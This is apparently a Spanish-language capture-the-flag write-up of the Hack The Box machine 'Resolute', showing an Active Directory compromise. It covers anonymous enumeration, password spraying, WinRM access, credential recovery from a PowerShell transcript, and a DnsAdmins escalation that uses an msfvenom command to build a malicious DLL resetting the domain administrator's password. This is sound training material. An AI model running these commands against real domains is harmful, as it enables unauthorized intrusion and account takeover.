---
title: "HTB: Resolute Writeup 🪟"
date: 2025-06-15
tags:
  - ActiveDirectory
  - Windows
  - Ciberseguridad
  - smb
  - "#bloodhound"
  - "#NTLM"
description: Resolute es una máquina de Active Directory en Windows donde se aprovecha un bind anónimo para obtener una contraseña reutilizada. Esto permite acceso inicial vía WinRM, escalada lateral con credenciales en un transcript de PowerShell, y finalmente privilegios de SYSTEM explotando permisos del grupo DnsAdmins para ejecutar código en el controlador de dominio
---
---
# Resolute

Resolute es una máquina Windows de dificultad fácil que utiliza Active Directory. Se usa una conexión anónima al Active Directory para obtener una contraseña que los administradores del sistema establecen para las nuevas cuentas de usuario, aunque parece que la contraseña de esa cuenta ya ha sido cambiada.

Un ataque de password spraying revela que esa misma contraseña aún se usa en otra cuenta de usuario del dominio, lo que nos da acceso al sistema a través de WinRM. Luego, se descubre un registro de transcripción de PowerShell, que ha capturado credenciales pasadas por línea de comandos.

Estas credenciales se usan para moverse lateralmente hacia un usuario que es miembro del grupo DnsAdmins. Este grupo tiene la capacidad de indicar que el servicio del servidor DNS cargue un plugin en formato DLL. Tras reiniciar el servicio DNS, se logra la ejecución de comandos en el controlador de dominio con el contexto de NT_AUTHORITY\SYSTEM.

---
<figure>
<img src="/assets/img/Resolute/Resolute.png" alt="Resolute">
<figcaption>Fig 1. Resolute HTB</figcaption>
</figure>


Comenzamos la resolución de la máquina realizando un escaneo de puertos con la herramienta Nmap. A partir de los resultados, observamos que se trata de una máquina asociada a un entorno de Active Directory, ya que se encuentra activo el puerto 53 (DNS), junto con otros servicios típicos que suelen estar presentes en controladores de dominio.

<figure>
<img src="/assets/img/Resolute/imagen1.png" >
</figure>  

A continuación, ejecutamos algunos scripts y detección de servicios para recopilar más información del sistema, como por ejemplo el nombre del dominio al que pertenece la máquina objetivo.

<figure>
<img src="/assets/img/Resolute/imagen2.png" >
</figure>  

```Info
Nombre de Dominio = megabank.local
```

Procedemos a lanzar algunos scripts específicos de LDAP utilizando Nmap, con el objetivo de enumerar información relevante del servicio de directorio activo expuesto.

<figure>
<img src="/assets/img/Resolute/imagen3.png" >
</figure>  

Aunque los scripts LDAP no tuvieron éxito, identifiqué que el servidor permite conexión anónima. Por ello, utilizo rpcclient para intentar enumerar usuarios válidos en el objetivo. Los resultados obtenidos son los siguientes:

<figure>
<img src="/assets/img/Resolute/imagen4.png" >
</figure>  

para establecer la conexión debemos usar el comando 
```bash
rpcclient -U "" -N target
```
También podemos utilizar la herramienta ldapsearch, la cual nos devuelve una gran cantidad de información. Sin embargo, debido al volumen, es complicado identificar con precisión los nombres de usuario. Consulté a ChatGPT sobre contraseñas por defecto y me indicó que, por lo general, estas se aplican a cuentas de usuario creadas recientemente. Por ello, vamos a enfocarnos únicamente en los últimos usuarios enumerados para llevar a cabo un ataque de fuerza bruta.

<figure>
<img src="/assets/img/Resolute/imagen5.png" >
</figure>  

Es momento de utilizar hydra para intentar identificar contraseñas válidas, aunque también podemos apoyarnos en la herramienta windapsearch para verificar si alguna cuenta tiene una contraseña expuesta.
Un dato clave que no debemos pasar por alto es el valor de ldapServiceName, que en este caso es:
ldapServiceName: megabank.local:resolute$@MEGABANK.LOCAL
Con esta información, procedemos a enumerar usuarios utilizando el siguiente comando:

```bash
windapsearch -d megabank.local --dc-ip 10.10.10.169 -U  
```

Se nos mostrara algo así:

<figure>
<img src="/assets/img/Resolute/imagen6.png" >
</figure>  

Ahora con el siguiente comando es posible encontrar alguna contraseña

```bash
windapsearch -d megabank.local --dc-ip 10.10.10.169 -U --full | grep Password
```

<figure>
<img src="/assets/img/Resolute/imagen7.png" >
</figure>  

Ahora si que si podemos utilizar hydra para encontrar a quien le pertenece dicha clave, la clave pertenece a la cuenta del usuario Melanie 

<figure>
<img src="/assets/img/Resolute/imagen8.png" >
</figure>  

iniciamos sesión son evil-winrm 

<figure>
<img src="/assets/img/Resolute/imagen9.png" >
</figure>  

**Ahora utilizo la herramienta `bloodhound-python` para recolectar información sobre la cuenta dentro del dominio. Esto me permitirá mapear relaciones y posibles caminos de escalada de privilegios en el entorno.**
**El comando utilizado fue:**

```bash
bloodhound-python -d megabank.local -u melanie -p welcome123! -gc resolute.megabank.local -c all -ns <IP> --zip
```

> 🔎 *Nota: recuerda reemplazar `<IP>` con la dirección IP real del controlador de dominio.*

<figure>
<img src="/assets/img/Resolute/imagen10.png" >
</figure>  

Ahora es momento de llevarlo a nuestra herramienta de bloodhound, nuestro usuario no tiene ningún privilegio 

<figure>
<img src="/assets/img/Resolute/imagen11.png" >
</figure>  

No es posible obtener privilegios de administrador directamente con la cuenta actual, por lo que es momento de realizar movimiento lateral. Navegamos hacia la carpeta Users y encontramos un usuario llamado ryan.

<figure>
<img src="/assets/img/Resolute/imagen12.png" >
</figure>  


**Sabemos que aplicar fuerza bruta contra esta cuenta no es viable. Intenté iniciar sesión mediante `msfconsole` utilizando el módulo `psexec`, pero no funcionó, así que continuamos con la herramienta `Evil-WinRM`. Ahora, el objetivo es encontrar alguna forma de autenticarnos como el usuario `ryan`.**

> 💡 *Para las siguientes pruebas de recolección, recomiendo usar el comando:*

```bash
shelldir -force
```

Este nos mostrará información oculta que puede ser útil.

Primero consulté con ChatGPT sobre la ubicación del historial de comandos en PowerShell y me indicó la siguiente ruta:

```bash
C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Sin embargo, esa ruta no me arrojó resultados útiles.

<figure>
<img src="/assets/img/Resolute/imagen13.png" >
</figure>  

Así que decidimos volver al directorio principal en busca de información relevante. Al explorar, encontramos un directorio poco común que llamó bastante la atención:

<figure>
<img src="/assets/img/Resolute/imagen14.png" >
</figure>  

Dentro del directorio PSTranscripts/20191203 descubrimos un archivo de historial, exactamente lo que estábamos buscando anteriormente:

<figure>
<img src="/assets/img/Resolute/imagen15.png" >
</figure>  
Al leer el contenido del archivo, encontramos las credenciales del usuario ryan:

<figure>
<img src="/assets/img/Resolute/imagen16.png" >
</figure>  

```Contraseña
ryan - Serv3r4Admin4cc123!
```

Aprovechando que ya tenemos BloodHound abierto, nos apoyamos en él para entender mejor cómo está estructurado el dominio y posibles rutas de escalada.

<figure>
<img src="/assets/img/Resolute/imagen17.png" >
</figure>  

# Escalada de Privilegios

**Descubrimos que el usuario `ryan` pertenece al grupo `DnsAdmins`, lo que abre la puerta a una técnica clásica de escalada de privilegios.**

### 🧠 Contexto: ¿Qué puede hacer el grupo `DnsAdmins`?

El grupo **DnsAdmins** tiene permisos avanzados sobre el servicio DNS de Windows, incluyendo la capacidad de especificar qué DLL se carga al iniciar el servicio. Si logramos que el servicio DNS cargue una DLL maliciosa, podemos ejecutar comandos con privilegios de **NT AUTHORITY\SYSTEM**.

### ⚙️ Paso 1: Generar una DLL maliciosa

El primer paso es crear una DLL que, al ser ejecutada por el servicio DNS, cambie la contraseña del usuario `administrator`.

#### Comando utilizado con `msfvenom`:

```bash
msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll
```

* `-p windows/x64/exec`: Genera un payload para ejecutar un comando en Windows de 64 bits.
* `cmd='net user administrator P@s5w0rd123! /domain'`: Cambia la contraseña del usuario `administrator`.
* `-f dll`: Indica que la salida será en formato DLL.
* `> da.dll`: Guarda el archivo con el nombre `da.dll`.

<figure><img src="/assets/img/Resolute/imagen18.png"></figure>

### 📡 Paso 2: Iniciar servidor SMB con Impacket

Para entregar la DLL a través de la red, iniciamos un servidor SMB:

<figure><img src="/assets/img/Resolute/imagen19.png"></figure>

### 🧨 Paso 3: Ejecutar el ataque en la máquina víctima

Desde la máquina comprometida, configuramos el servicio DNS para que cargue nuestra DLL maliciosa. Esto se logra ejecutando el comando correspondiente (mostrado en la imagen):

<figure><img src="/assets/img/Resolute/imagen20.png"></figure>

Luego, reiniciamos el servicio DNS:

<figure><img src="/assets/img/Resolute/imagen21.png"></figure>


### 🔓 Paso 4: Acceso como SYSTEM con Impacket

Con la contraseña del administrador ya modificada, utilizamos `impacket-psexec` para conectarnos como `administrator` y obtener una shell con privilegios de SYSTEM:

<figure><img src="/assets/img/Resolute/imagen22.png"></figure>

**¡Y con esto completamos el compromiso total del controlador de dominio!**

<div style="width:100%;height:0;padding-bottom:56%;position:relative;"><iframe src="https://giphy.com/embed/u9293Xrizd0tO" width="100%" height="100%" style="position:absolute" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div><p><a href="https://giphy.com/gifs/mr-robot-showmax-u9293Xrizd0tO">via GIPHY</a></p>
